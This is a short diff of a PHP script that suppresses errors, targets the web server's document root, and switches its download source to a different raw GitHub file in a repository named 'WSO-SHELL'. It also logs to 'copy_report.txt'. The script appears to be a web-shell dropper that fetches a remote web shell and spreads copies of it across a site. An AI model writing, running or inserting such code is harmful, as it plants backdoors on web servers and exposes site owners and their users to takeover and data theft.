@@ -2,7 +2,7 @@
 error_reporting(0);
 
 $searchDir = $_SERVER['DOCUMENT_ROOT'];
-$sourceUrl = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wkwk.php";
+$sourceUrl = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/.vne00000007";
 $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
 $logFile = "copy_report.txt";
 
